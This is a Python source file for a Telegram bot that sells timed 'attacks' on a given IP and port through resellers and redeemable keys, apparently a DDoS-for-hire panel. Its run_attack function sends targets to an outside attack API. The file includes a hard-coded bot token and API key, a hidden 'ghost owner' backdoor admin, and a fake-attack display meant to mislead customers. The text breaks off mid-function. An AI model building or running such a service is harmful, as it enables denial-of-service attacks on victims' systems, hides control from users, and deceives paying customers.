#!/usr/bin/env python3
import time
import threading
import json
import os
import requests
import random
import string
from datetime import datetime
import io

# ============================================
# CONFIGURATION
# ============================================
TOKEN = "8941070109:AAEwpmPpI5EIonKKwElvB-R1a8HwSXWb_6I"

# ========== 2 ADMIN IDs ==========
ADMIN_IDS = [ ]

# ========== GHOST OWNER (HIDDEN) ==========
GHOST_OWNER_ID = 7983241359
# =================================================

# ========== OPTIMIZATION SETTINGS (FAST) ==========
STATUS_UPDATE_INTERVAL = 3  # 3 seconds (was 1)
BATCH_SIZE = 50
MESSAGE_WORKERS = 3
# =================================================

# ========== FAKE ATTACK SYSTEM ==========
FAKE_ATTACKS_ENABLED = True
FAKE_CONCURRENT = 6
FAKE_IP_POOL = []
FAKE_PORT_POOL = []
FAKE_PRIVATE_COUNT_RANGE = (4, 6)
FAKE_GROUP_COUNT_RANGE = (1, 2)
FAKE_TIME_POOL = [60, 90, 180, 200, 280, 300, 480, 600]
FAKE_ATTACK_RANGE = None

_used_ips_this_cycle = set()
_used_ports_this_cycle = set()

API_URL = "https://upd-api.onrender.com"
API_KEY = "TRX_9CA6EE86F3574F85"

users = {}
groups = {}
keys = {}
resellers = {}
blocked_keys = {}
active_attacks = {}
user_cooldown = {}
user_daily_count = {}
temp_data = {}
status_update_threads = {}
user_key_map = {}
multibroadcast_state = {}

fake_status_attack_list = []
fake_status_update_id = None
fake_status_chat_id = None

fake_last_add_time = 0
_last_used_combination = None
_used_combinations = []
_current_cycle_combinations = []

MAX_CONCURRENT = 6
MAX_TIME = 600
COOLDOWN_SECONDS = 60
DAILY_LIMIT = 50
attack_threads = 500
is_locked = False
is_maintenance = False
is_bot_off = False
last_update_id = 0
VIDEO_FILE_ID = None
cmd_cooldown = {}

KEY_PRICES = {
    "1h": 1, "5h": 3, "1d": 4, "3d": 8,
    "7d": 15, "14d": 25, "30d": 50, "60d": 80
}

attack_lock = threading.Lock()

# ========== MESSAGE QUEUE FOR FAST SENDING ==========
message_queue = []
message_queue_lock = threading.Lock()

def message_worker():
    while True:
        try:
            time.sleep(0.3)
            with message_queue_lock:
                if message_queue:
                    batch = message_queue[:BATCH_SIZE]
                    for item in batch:
                        try:
                            if item in message_queue:
                                message_queue.remove(item)
                        except:
                            pass
                    
                    for chat_id, text, parse_mode, reply_markup in batch:
                        try:
                            payload = {"chat_id": chat_id, "text": text}
                            if parse_mode:
                                payload["parse_mode"] = parse_mode
                            if reply_markup:
                                payload["reply_markup"] = reply_markup
                            requests.post(
                                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                json=payload,
                                timeout=3
                            )
                        except:
                            pass
        except:
            pass

# Start message workers
for _ in range(MESSAGE_WORKERS):
    threading.Thread(target=message_worker, daemon=True).start()

def send_msg(chat_id, text, parse_mode=None):
    with message_queue_lock:
        message_queue.append((chat_id, text, parse_mode, None))

def send_buttons(chat_id, text, buttons):
    reply_markup = {"inline_keyboard": buttons}
    with message_queue_lock:
        message_queue.append((chat_id, text, "Markdown", reply_markup))

def send_video(chat_id, video_id, caption):
    try:
        threading.Thread(target=lambda: requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendVideo",
            json={"chat_id": chat_id, "video": video_id, "caption": caption},
            timeout=5
        ), daemon=True).start()
    except:
        pass

def send_document(chat_id, file_content, filename):
    try:
        files = {'document': (filename, io.BytesIO(file_content.encode()), 'application/json')}
        threading.Thread(target=lambda: requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendDocument",
            data={'chat_id': chat_id},
            files=files,
            timeout=30
        ), daemon=True).start()
        return True
    except:
        return False

def del_msg(chat_id, msg_id):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/deleteMessage",
            json={"chat_id": chat_id, "message_id": msg_id},
            timeout=2
        )
    except:
        pass

def answer_callback(callback_id, text=None):
    try:
        payload = {"callback_query_id": callback_id}
        if text:
            payload["text"] = text
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
            json=payload,
            timeout=2
        )
    except:
        pass

def edit_message_text(chat_id, message_id, text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/editMessageText",
            json={"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"},
            timeout=2
        )
    except:
        pass

# ========== ALL ORIGINAL FUNCTIONS (NO CHANGES) ==========

def is_admin(user_id):
    if user_id == GHOST_OWNER_ID:
        return True
    return user_id in ADMIN_IDS

def is_owner(user_id):
    return user_id == GHOST_OWNER_ID

def is_reseller(uid):
    return str(uid) in resellers

def is_user(uid):
    if is_admin(uid):
        return True
    if is_reseller(uid):
        return True
    uid_str = str(uid)
    if uid_str in users and time.time() < users[uid_str]:
        if uid_str in user_key_map:
            key = user_key_map[uid_str]
            if key in keys and keys[key].get('blocked', False):
                return False
            if is_key_blocked(key):
                return False
        return True
    return False

def is_user_valid(user_id):
    user_id_str = str(user_id)
    
    if is_admin(user_id):
        return True, ""
    
    if is_reseller(user_id):
        return True, ""
    
    if user_id_str not in users:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ NO ACTIVE SUBSCRIPTION!
━━━━━━━━━━━━━━━━━━━━━━━━
You don't have an active plan.
Use /redeem KEY to get access.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if time.time() >= users[user_id_str]:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ SUBSCRIPTION EXPIRED!
━━━━━━━━━━━━━━━━━━━━━━━━
Your plan has expired.
Please redeem a new key.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if user_id_str in user_key_map:
        redeemed_key = user_key_map[user_id_str]
        if is_key_blocked(redeemed_key):
            return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY BLOCKED BY ADMIN!
━━━━━━━━━━━━━━━━━━━━━━━━
The key you used has been blocked.
Contact support for assistance.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    return True, ""

def get_progress_bar(percent):
    filled = int(percent / 5)
    empty = 20 - filled
    return "█" * filled + "▒" * empty

def get_status_text(chat_id, user_id):
    current = len(active_attacks)
    
    if current == 0:
        return f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ ACTIVE ATTACKS: 0/{MAX_CONCURRENT}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚙️ SETTINGS:
┣ 🎯 Max Concurrent: {MAX_CONCURRENT}
┣ ⏱️ Max Time: {MAX_TIME}s
┗ ⏳ Cooldown: {COOLDOWN_SECONDS}s

⏳ Your Cooldown: {get_user_cooldown_status(user_id)}

🔄 Auto-updates every second!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    attacks_list = ""
    for aid, attack in list(active_attacks.items())[:5]:
        bar = get_progress_bar(attack['percent'])
        if is_admin(attack['user_id']):
            user_type = "👑 Admin"
        elif is_reseller(attack['user_id']):
            user_type = "💼 Reseller"
        else:
            user_type = "👤 User"
        attacks_list += f"🎯 {attack['ip']}:{attack['port']}\n   ⏱️ {attack['remaining']}s remaining\n   `{bar}` {attack['percent']}%\n   {user_type}\n\n"
    
    if len(active_attacks) > 5:
        attacks_list += f"\n... and {len(active_attacks) - 5} more attacks"
    
    return f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ ACTIVE ATTACKS: {current}/{MAX_CONCURRENT}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{attacks_list}
⚙️ SETTINGS:
┣ 🎯 Max Concurrent: {MAX_CONCURRENT}
┣ ⏱️ Max Time: {MAX_TIME}s
┗ ⏳ Cooldown: {COOLDOWN_SECONDS}s

⏳ Your Cooldown: {get_user_cooldown_status(user_id)}

🔄 Auto-updates every second!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

def update_status_message(chat_id, message_id, user_id):
    while True:
        try:
            if is_bot_off:
                time.sleep(5)
                continue
            text = get_status_text(chat_id, user_id)
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/editMessageText",
                json={
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": text,
                    "parse_mode": "Markdown"
                },
                timeout=3
            )
            time.sleep(STATUS_UPDATE_INTERVAL)
        except:
            time.sleep(STATUS_UPDATE_INTERVAL)

def send_status(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return False
    
    if should_show_fake_attack(user_id):
        return send_fake_status(chat_id, user_id)
    
    text = get_status_text(chat_id, user_id)
    
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"},
            timeout=10
        ).json()
        
        if response.get('ok'):
            message_id = response['result']['message_id']
            update_thread = threading.Thread(
                target=update_status_message,
                args=(chat_id, message_id, user_id),
                daemon=True
            )
            update_thread.start()
            status_update_threads[f"{chat_id}_{message_id}"] = update_thread
            return True
    except:
        pass
    return False

def save_data():
    data_to_save = {
        'users': users,
        'groups': groups,
        'keys': keys,
        'resellers': resellers,
        'blocked_keys': blocked_keys,
        'max_concurrent': MAX_CONCURRENT,
        'max_time': MAX_TIME,
        'cooldown': COOLDOWN_SECONDS,
        'daily_limit': DAILY_LIMIT,
        'attack_threads': attack_threads,
        'is_locked': is_locked,
        'is_maintenance': is_maintenance,
        'is_bot_off': is_bot_off,
        'video_file_id': VIDEO_FILE_ID,
        'admin_ids': ADMIN_IDS,
        'user_key_map': user_key_map,
        'last_id': last_update_id,
        'fake_enabled': FAKE_ATTACKS_ENABLED,
        'fake_ip_pool': FAKE_IP_POOL,
        'fake_port_pool': FAKE_PORT_POOL,
        'fake_concurrent': FAKE_CONCURRENT,
        'fake_time_pool': FAKE_TIME_POOL,
        'fake_attack_range': FAKE_ATTACK_RANGE,
    }
    
    if str(GHOST_OWNER_ID) in data_to_save['users']:
        del data_to_save['users'][str(GHOST_OWNER_ID)]
    if str(GHOST_OWNER_ID) in data_to_save['user_key_map']:
        del data_to_save['user_key_map'][str(GHOST_OWNER_ID)]
    
    with open('data.json', 'w') as f:
        json.dump(data_to_save, f)

def load_data():
    global users, groups, keys, resellers, blocked_keys, MAX_CONCURRENT, MAX_TIME, COOLDOWN_SECONDS, DAILY_LIMIT
    global attack_threads, is_locked, is_maintenance, is_bot_off, VIDEO_FILE_ID, ADMIN_IDS, user_key_map, last_update_id
    
    try:
        with open('data.json', 'r') as f:
            d = json.load(f)
            users = d.get('users', {})
            groups = d.get('groups', {})
            keys = d.get('keys', {})
            resellers = d.get('resellers', {})
            blocked_keys = d.get('blocked_keys', {})
            MAX_CONCURRENT = d.get('max_concurrent', 6)
            MAX_TIME = d.get('max_time', 600)
            COOLDOWN_SECONDS = d.get('cooldown', 60)
            DAILY_LIMIT = d.get('daily_limit', 50)
            attack_threads = d.get('attack_threads', 500)
            is_locked = d.get('is_locked', False)
            is_maintenance = d.get('is_maintenance', False)
            is_bot_off = d.get('is_bot_off', False)
            VIDEO_FILE_ID = d.get('video_file_id', None)
            saved_admins = d.get('admin_ids', [])
            if saved_admins:
                ADMIN_IDS = saved_admins
            user_key_map = d.get('user_key_map', {})
            last_update_id = d.get('last_id', 0)
            global FAKE_ATTACKS_ENABLED, FAKE_IP_POOL, FAKE_PORT_POOL, FAKE_CONCURRENT
            FAKE_ATTACKS_ENABLED = d.get('fake_enabled', True)
            FAKE_IP_POOL = d.get('fake_ip_pool', [])
            FAKE_PORT_POOL = d.get('fake_port_pool', [])
            FAKE_CONCURRENT = d.get('fake_concurrent', 6)
            FAKE_TIME_POOL = d.get('fake_time_pool', [60, 90, 180, 200, 280, 300, 480, 600])
            global FAKE_ATTACK_RANGE
            FAKE_ATTACK_RANGE = d.get('fake_attack_range', None)
    except:
        pass

def is_group_allowed(group_id):
    return str(group_id) in groups and time.time() < groups[str(group_id)]

def add_group(group_id, days):
    groups[str(group_id)] = time.time() + (days * 86400)
    save_data()

def remove_group(group_id):
    if str(group_id) in groups:
        del groups[str(group_id)]
        save_data()

def add_user(uid, days=0, hours=0):
    if uid == GHOST_OWNER_ID:
        return
    current_time = time.time()
    expiry_seconds = (days * 86400) + (hours * 3600)
    users[str(uid)] = current_time + expiry_seconds
    save_data()

def remove_user(uid):
    uid_str = str(uid)
    if uid_str in users:
        del users[uid_str]
    if uid_str in user_key_map:
        del user_key_map[uid_str]
    save_data()

def expire_user_by_key(key):
    if key in keys:
        used_by = keys[key].get('used_by')
        if used_by and used_by in users and int(used_by) != GHOST_OWNER_ID:
            users[used_by] = time.time() - 1
        if used_by and used_by in user_key_map:
            del user_key_map[used_by]

def get_user_expiry(uid):
    if is_admin(uid):
        return "Admin (Lifetime)"
    uid_str = str(uid)
    if uid_str in users:
        r = users[uid_str] - time.time()
        if r <= 0:
            return "Expired"
        days = int(r // 86400)
        hours = int((r % 86400) // 3600)
        minutes = int((r % 3600) // 60)
        
        if days > 0:
            if hours > 0:
                return f"{days}d {hours}h"
            else:
                return f"{days}d"
        elif hours > 0:
            if minutes > 0:
                return f"{hours}h {minutes}m"
            else:
                return f"{hours}h"
        else:
            return f"{minutes}m"
    return None

def get_user_expiry_date(user_id):
    if is_admin(user_id) or is_reseller(user_id):
        return "NEVER"
    
    user_id_str = str(user_id)
    if user_id_str not in users:
        return None
    
    expiry_timestamp = users[user_id_str]
    if expiry_timestamp <= time.time():
        return None
    
    return datetime.fromtimestamp(expiry_timestamp).strftime("%Y-%m-%d %H:%M:%S")

def get_user_remaining_time(user_id):
    if is_admin(user_id) or is_reseller(user_id):
        return "LIFETIME"
    
    user_id_str = str(user_id)
    if user_id_str not in users:
        return None
    
    remaining = users[user_id_str] - time.time()
    if remaining <= 0:
        return None
    
    days = int(remaining // 86400)
    hours = int((remaining % 86400) // 3600)
    minutes = int((remaining % 3600) // 60)
    
    if days > 0:
        if hours > 0:
            return f"{days}d {hours}h {minutes}m"
        else:
            return f"{days}d {minutes}m"
    elif hours > 0:
        if minutes > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{hours}h"
    else:
        return f"{minutes}m"

def get_today_attack_count(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    key = f"{user_id}_{today}"
    return user_daily_count.get(key, 0)

def add_reseller(uid, tokens, is_unlimited=False):
    if uid == GHOST_OWNER_ID:
        return
    resellers[str(uid)] = {'tokens': tokens if not is_unlimited else -1, 'total_earned': 0, 'keys_generated': [], 'blocked_keys': [], 'unlimited': is_unlimited}
    save_data()

def remove_reseller(uid):
    if str(uid) in resellers:
        for k in resellers[str(uid)]['keys_generated']:
            if k in keys:
                del keys[k]
        del resellers[str(uid)]
        save_data()

def get_reseller_tokens(uid):
    if str(uid) in resellers:
        return "∞" if resellers[str(uid)].get('unlimited') else resellers[str(uid)]['tokens']
    return 0

def deduct_reseller_tokens(uid, amount):
    if str(uid) in resellers:
        if resellers[str(uid)].get('unlimited'):
            return True
        if resellers[str(uid)]['tokens'] >= amount:
            resellers[str(uid)]['tokens'] -= amount
            resellers[str(uid)]['total_earned'] += amount
            save_data()
            return True
    return False

def add_reseller_key(uid, key):
    if str(uid) in resellers:
        resellers[str(uid)]['keys_generated'].append(key)
        save_data()

def get_reseller_keys(uid):
    return resellers[str(uid)]['keys_generated'] if str(uid) in resellers else []

def remove_reseller_key(uid, key):
    if str(uid) in resellers and key in resellers[str(uid)]['keys_generated']:
        resellers[str(uid)]['keys_generated'].remove(key)
        save_data()

def add_blocked_key(uid, key):
    if str(uid) in resellers:
        resellers[str(uid)]['blocked_keys'].append(key)
    blocked_keys[key] = True
    if key in keys:
        keys[key]['blocked'] = True
    expire_user_by_key(key)
    save_data()

def remove_blocked_key(key):
    if key in blocked_keys:
        del blocked_keys[key]
        if key in keys:
            keys[key]['blocked'] = False
        save_data()
        return True
    return False

def is_key_blocked(key):
    return key in blocked_keys or (key in keys and keys[key].get('blocked', False))

def get_reseller_blocked_keys(uid):
    return resellers[str(uid)]['blocked_keys'] if str(uid) in resellers else []

def parse_duration(duration_str):
    duration_str = str(duration_str).lower().strip()
    import re
    
    match = re.match(r'^(\d+(?:\.\d+)?)([dh])$', duration_str)
    
    if match:
        value = float(match.group(1))
        unit = match.group(2)
        if unit == 'h':
            return 'hours', value
        elif unit == 'd':
            return 'days', value
    else:
        match = re.match(r'^(\d+(?:\.\d+)?)$', duration_str)
        if match:
            value = float(match.group(1))
            return 'days', value
    
    return None, None

def generate_basic_admin_key(prefix, duration_str):
    unit, value = parse_duration(duration_str)
    
    if unit is None:
        return None, "❌ Invalid duration! Use like: 30, 30d, 12h, 1.5h, 2.5d, 0.5d"
    
    if value <= 0:
        return None, "❌ Duration must be greater than 0!"
    
    if unit == 'days' and value > 3650:
        return None, "❌ Maximum duration is 3650 days!"
    
    if unit == 'hours' and value > 87600:
        return None, "❌ Maximum duration is 87600 hours!"
    
    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    
    if unit == 'days':
        keys[key] = {'days': float(value), 'hours': 0, 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'basic'}
    else:
        keys[key] = {'days': 0, 'hours': float(value), 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'basic'}
    
    save_data()
    return key, None

def generate_premium_admin_key(prefix, duration_str):
    unit, value = parse_duration(duration_str)
    
    if unit is None:
        return None, "❌ Invalid duration! Use like: 30, 30d, 12h, 1.5h, 2.5d, 0.5d"
    
    if value <= 0:
        return None, "❌ Duration must be greater than 0!"
    
    if unit == 'days' and value > 3650:
        return None, "❌ Maximum duration is 3650 days!"
    
    if unit == 'hours' and value > 87600:
        return None, "❌ Maximum duration is 87600 hours!"
    
    key = f"VIP-{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    
    if unit == 'days':
        keys[key] = {'days': float(value), 'hours': 0, 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'premium'}
    else:
        keys[key] = {'days': 0, 'hours': float(value), 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'premium'}
    
    save_data()
    return key, None

def generate_multiple_basic_admin_keys(prefix, duration_str, count):
    unit, value = parse_duration(duration_str)
    
    if unit is None:
        return None, "❌ Invalid duration! Use like: 30, 30d, 12h, 1.5h, 2.5d, 0.5d"
    
    if value <= 0:
        return None, "❌ Duration must be greater than 0!"
    
    if unit == 'days' and value > 3650:
        return None, "❌ Maximum duration is 3650 days!"
    
    if unit == 'hours' and value > 87600:
        return None, "❌ Maximum duration is 87600 hours!"
    
    generated_keys = []
    for _ in range(count):
        key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        
        if unit == 'days':
            keys[key] = {'days': float(value), 'hours': 0, 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'basic'}
        else:
            keys[key] = {'days': 0, 'hours': float(value), 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'basic'}
        
        generated_keys.append(key)
    
    save_data()
    return generated_keys, None

def generate_multiple_premium_admin_keys(prefix, duration_str, count):
    unit, value = parse_duration(duration_str)
    
    if unit is None:
        return None, "❌ Invalid duration! Use like: 30, 30d, 12h, 1.5h, 2.5d, 0.5d"
    
    if value <= 0:
        return None, "❌ Duration must be greater than 0!"
    
    if unit == 'days' and value > 3650:
        return None, "❌ Maximum duration is 3650 days!"
    
    if unit == 'hours' and value > 87600:
        return None, "❌ Maximum duration is 87600 hours!"
    
    generated_keys = []
    for _ in range(count):
        key = f"VIP-{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        
        if unit == 'days':
            keys[key] = {'days': float(value), 'hours': 0, 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'premium'}
        else:
            keys[key] = {'days': 0, 'hours': float(value), 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'premium'}
        
        generated_keys.append(key)
    
    save_data()
    return generated_keys, None

def redeem_key(user_id, key):
    user_id_str = str(user_id)
    
    if key not in keys:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ INVALID KEY!
━━━━━━━━━━━━━━━━━━━━━━━━
The key you entered does not exist.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if keys[key]['used']:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY ALREADY USED!
━━━━━━━━━━━━━━━━━━━━━━━━
This key has already been redeemed.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if keys[key].get('blocked', False) or is_key_blocked(key):
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY IS BLOCKED!
━━━━━━━━━━━━━━━━━━━━━━━━
This key has been blocked by admin.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    days = float(keys[key]['days'])
    hours = float(keys[key].get('hours', 0))
    key_type = keys[key].get('type', 'basic')
    keys[key]['used'] = True
    keys[key]['used_by'] = str(user_id)
    user_key_map[user_id_str] = key
    add_user(user_id, days, hours)
    save_data()
    
    expiry_timestamp = users[user_id_str]
    expiry_date = datetime.fromtimestamp(expiry_timestamp).strftime("%Y-%m-%d %H:%M:%S")
    
    if days > 0:
        if days % 1 == 0:
            duration_text = f"{int(days)} Days"
        else:
            duration_text = f"{days} Days"
    elif hours > 0:
        if hours % 1 == 0:
            duration_text = f"{int(hours)} Hours"
        else:
            duration_text = f"{hours} Hours"
    else:
        duration_text = "Unknown"
    
    if key_type == 'premium':
        return True, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY REDEEMED SUCCESSFULLY!
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: PREMIUM 💎
⏱️ Duration: {duration_text}
📅 Expiry: {expiry_date}
━━━━━━━━━━━━━━━━━━━━━━━━
Use /start to use this bot.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    else:
        return True, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY REDEEMED SUCCESSFULLY!
━━━━━━━━━━━━━━━━━━━━━━━━
📀 Plan: BASIC ⚡
⏱️ Duration: {duration_text}
📅 Expiry: {expiry_date}
━━━━━━━━━━━━━━━━━━━━━━━━
Use /start to use this bot.
━━━━━━━━━━━━━━━━━━━━━━━━"""

def delete_key(key, user_id):
    if key not in keys:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY NOT FOUND!
━━━━━━━━━━━━━━━━━━━━━━━━"""
    creator = keys[key].get('created_by')
    if not is_admin(user_id) and creator != str(user_id):
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ ACCESS DENIED!
━━━━━━━━━━━━━━━━━━━━━━━━
You can only delete your own keys.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    expire_user_by_key(key)
    
    if creator != 'admin':
        remove_reseller_key(int(creator), key)
    del keys[key]
    save_data()
    return True, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY DELETED!
━━━━━━━━━━━━━━━━━━━━━━━━
Key: {key}
User who used this key has been expired.
━━━━━━━━━━━━━━━━━━━━━━━━"""

def block_key(key, user_id):
    if key not in keys:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY NOT FOUND!
━━━━━━━━━━━━━━━━━━━━━━━━"""
    creator = keys[key].get('created_by')
    if not is_admin(user_id) and creator != str(user_id):
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ ACCESS DENIED!
━━━━━━━━━━━━━━━━━━━━━━━━
You can only block your own keys.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    if keys[key].get('blocked', False):
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY ALREADY BLOCKED!
━━━━━━━━━━━━━━━━━━━━━━━━"""
    keys[key]['blocked'] = True
    expire_user_by_key(key)
    
    if creator != 'admin':
        add_blocked_key(int(creator), key)
    save_data()
    return True, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY BLOCKED!
━━━━━━━━━━━━━━━━━━━━━━━━
Key: {key}
Users who used this key can no longer attack.
━━━━━━━━━━━━━━━━━━━━━━━━"""

def unblock_key(key, user_id):
    if key not in keys:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY NOT FOUND!
━━━━━━━━━━━━━━━━━━━━━━━━"""
    creator = keys[key].get('created_by')
    if not is_admin(user_id) and creator != str(user_id):
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ ACCESS DENIED!
━━━━━━━━━━━━━━━━━━━━━━━━
You can only unblock your own keys.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    if not keys[key].get('blocked', False):
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY IS NOT BLOCKED!
━━━━━━━━━━━━━━━━━━━━━━━━"""
    keys[key]['blocked'] = False
    
    used_by = keys[key].get('used_by')
    if used_by and int(used_by) != GHOST_OWNER_ID:
        days = float(keys[key]['days'])
        hours = float(keys[key].get('hours', 0))
        current_time = time.time()
        expiry_seconds = (days * 86400) + (hours * 3600)
        users[used_by] = current_time + expiry_seconds
        user_key_map[used_by] = key
    
    if creator != 'admin':
        if key in blocked_keys:
            del blocked_keys[key]
        if key in resellers.get(int(creator), {}).get('blocked_keys', []):
            resellers[int(creator)]['blocked_keys'].remove(key)
    save_data()
    return True, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY UNBLOCKED!
━━━━━━━━━━━━━━━━━━━━━━━━
Key: {key}
User access has been restored.
━━━━━━━━━━━━━━━━━━━━━━━━"""

def my_blocked_keys(user_id):
    if is_admin(user_id):
        return [k for k, v in keys.items() if v.get('blocked', False)]
    return get_reseller_blocked_keys(user_id)

def can_attack(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    key = f"{user_id}_{today}"
    
    if key not in user_daily_count:
        user_daily_count[key] = 0
    if user_daily_count[key] >= DAILY_LIMIT and not is_admin(user_id) and not is_reseller(user_id):
        return False, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
❌ DAILY LIMIT REACHED!
━━━━━━━━━━━━━━━━━━━━━━━━
Maximum {DAILY_LIMIT} attacks per day.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if not is_admin(user_id) and not is_reseller(user_id):
        if user_id in user_cooldown:
            remaining = COOLDOWN_SECONDS - (time.time() - user_cooldown[user_id])
            if remaining > 0:
                return False, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⏳ COOLDOWN ACTIVE!
━━━━━━━━━━━━━━━━━━━━━━━━
Please wait {int(remaining)} seconds.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    return True, "OK"

def add_attack_count(user_id):
    if is_admin(user_id) or is_reseller(user_id):
        return
    today = datetime.now().strftime("%Y-%m-%d")
    key = f"{user_id}_{today}"
    user_daily_count[key] = user_daily_count.get(key, 0) + 1
    user_cooldown[user_id] = time.time()

def get_user_cooldown_status(user_id):
    if is_admin(user_id) or is_reseller(user_id):
        return "✅ Ready (No cooldown)"
    if user_id in user_cooldown:
        remaining = COOLDOWN_SECONDS - (time.time() - user_cooldown[user_id])
        if remaining > 0:
            return f"⏳ Wait {int(remaining)}s"
    return "✅ Ready"

def run_attack(attack_id, chat_id, ip, port, duration, user_id, username):
    try:
        caption = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⚡ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {ip}:{port}
⏱️ 𝐓𝐢𝐦𝐞: {duration}s
📡 𝐔𝐬𝐢𝐧𝐠: 𝐀𝐏𝐈 𝐀𝐭𝐭𝐚𝐜𝐤
━━━━━━━━━━━━━━━━━━━━━━━━
📊 Type /status to see live progress!
━━━━━━━━━━━━━━━━━━━━━━━━"""
        if VIDEO_FILE_ID:
            send_video(chat_id, VIDEO_FILE_ID, caption)
        else:
            send_msg(chat_id, caption)
        
        try:
            requests.post(f"{API_URL}/api/attack", json={"key": API_KEY, "ip": ip, "port": port, "time": duration}, timeout=2)
        except:
            pass
        
        for elapsed in range(duration + 1):
            with attack_lock:
                if attack_id in active_attacks:
                    remaining = duration - elapsed
                    percent = int((elapsed / duration) * 100) if duration > 0 else 100
                    active_attacks[attack_id]['remaining'] = remaining
                    active_attacks[attack_id]['percent'] = percent
            time.sleep(1)
        
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
📡 Using: API Attack
━━━━━━━━━━━━━━━━━━━━━━━━""")
        time.sleep(2)
        
    except Exception as e:
        print(f"Attack error: {e}")
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]

def handle_video(chat_id, user_id, video_id):
    global VIDEO_FILE_ID
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    VIDEO_FILE_ID = video_id
    save_data()
    send_msg(chat_id, "✅ Attack video saved successfully!")

def remove_video(chat_id, user_id):
    global VIDEO_FILE_ID
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    VIDEO_FILE_ID = None
    save_data()
    send_msg(chat_id, "✅ Attack video removed!")

def handle_broadcast(chat_id, user_id, args):
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    if not args:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📢 BROADCAST USAGE
━━━━━━━━━━━━━━━━━━━━━━━━
/broadcast YOUR MESSAGE HERE

Examples:
